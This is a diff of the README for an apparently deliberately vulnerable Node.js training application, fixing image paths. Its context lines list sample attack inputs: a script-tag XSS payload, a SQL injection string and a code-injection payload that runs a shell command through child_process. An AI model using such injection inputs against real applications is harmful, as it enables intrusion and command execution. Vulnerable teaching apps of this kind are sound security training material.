@@ -19,11 +19,11 @@ $ docker-compose up
 ```
 http://localhost:3000
 ``````
-![Vulnerable Node Application](images\VulnerableNodeApplication.png)
+![Vulnerable Node Application](images/VulnerableNodeApplication.png)
 
 ## Vulnerabilidades 
 ### XSS
-![Cross-Site Script](images\xss.png)
+![Cross-Site Script](images/xss.png)
 ```
 /?userInput=<script>alert(1)</script>
 ```
@@ -36,7 +36,7 @@ http://localhost:3000/users?username=kid&access-token=CHAVE_MEGASECRETA_QsriGQQb
 /users?username='+or+1=1--&access-token=' 
 ```
 ### RCE
-![Remote Code Execution](images\rce.png)
+![Remote Code Execution](images/rce.png)
 ```
 /users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ping+-c+4+localhost').toString();%20}
 ```
